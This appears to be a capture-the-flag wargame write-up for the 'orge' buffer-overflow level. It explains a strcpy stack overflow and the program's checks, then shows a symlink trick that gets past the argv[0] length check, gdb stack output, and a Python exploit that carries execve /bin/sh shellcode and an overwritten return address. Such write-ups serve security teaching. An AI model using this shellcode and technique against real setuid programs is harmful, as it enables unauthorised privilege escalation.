# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
`orge` program uses strcpy() function to copy argv[1] to buffer's address.

The strcpy() function doesn't check boundary so that is vulnerable.

`orge`'s protection code is:
```c
// here is changed!
if(strlen(argv[0]) != 77){
              printf("argv[0] error\n");
              exit(0);
}

// egghunter 
for(i=0; environ[i]; i++)
  memset(environ[i], 0, strlen(environ[i]));

if(argv[1][47] != '\xbf')
{
  printf("stack is still your friend.\n");
  exit(0);
}

// check the length of argument
if(strlen(argv[1]) > 48){
  printf("argument is too long!\n");
  exit(0);
}

// buffer hunter
memset(buffer, 0, 40);
```
argv[0]'s length check is added. It checks file name is 77 bytes or not.

# Exploitation
As the program doesn't reset argv[1]'s address, I will use argv[1]'s address to RET.

Bypass argv[0]'s length check by using `ln -s` symbolic file.

```bash
[darkelf@localhost darkelf]$ cp ./orge ./asdf
[darkelf@localhost darkelf]$ 
[darkelf@localhost darkelf]$ ln -s /home/darkelf/asdf /home/darkelf/`python -c 'print "A"*63'`
[darkelf@localhost darkelf]$ /home/darkelf/`python -c 'print "A"*63'` `python -c 'print "\xbf"*48'`
¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿
Segmentation fault
[darkelf@localhost darkelf]$ 
```

length check is bypassed successfully.

Now, send a payload to get core file(to know where is argv[1]).

The stack is:
```
(gdb) x/32x 0xbffffbdc
0xbffffbdc:	0x90909090	0x90909090	0x90909090	0x6850c031
0xbffffbec:	0x68732f2f	0x69622f68	0x50e3896e	0x31e18953
0xbffffbfc:	0xcd0bb0d2	0x41414180	0xfffc3441	0x000000bf
```
# Payload
```python
import os
from struct import *

filename = ""
filename = filename + "/home/darkelf/"
filename = filename + "A"*63

print len(filename)

payload = ""
payload = payload + "\x90" * 15
payload = payload + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload = payload + "AAAA" # SFP
payload = payload + "\xe0\xfb\xff\xbf" # RET

os.execv(filename, [filename, payload])
```
